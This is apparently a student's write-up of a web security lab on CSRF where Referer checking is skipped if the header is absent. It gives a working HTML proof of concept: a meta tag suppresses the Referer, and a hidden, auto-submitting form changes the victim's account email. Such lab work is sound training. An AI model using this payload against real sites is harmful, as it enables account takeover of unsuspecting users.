# [CSRF] LAB: CSRF where Referer validation depends on header being present (1)

---

![Untitled](%5BCSRF%5D%20LAB%20CSRF%20where%20Referer%20validation%20depends%20o%20ff67f61c58ce433d9f71a7dd340ef58a/Untitled.png)

![Untitled](%5BCSRF%5D%20LAB%20CSRF%20where%20Referer%20validation%20depends%20o%20ff67f61c58ce433d9f71a7dd340ef58a/Untitled%201.png)

![Untitled](%5BCSRF%5D%20LAB%20CSRF%20where%20Referer%20validation%20depends%20o%20ff67f61c58ce433d9f71a7dd340ef58a/Untitled%202.png)

since when we remove the referer header the request still works we can generate a simple csrf PoC and include the meta tag in our HTML we server to the victim. 

```jsx
<meta name="referrer" content="never">
```

so the payload could look like this: 

```jsx
<html>
  <meta name="referrer" content="never">
  <body>
    <form action="https://0a01000003e7913880510dcd000800f3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;c" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![Untitled](%5BCSRF%5D%20LAB%20CSRF%20where%20Referer%20validation%20depends%20o%20ff67f61c58ce433d9f71a7dd340ef58a/Untitled%203.png)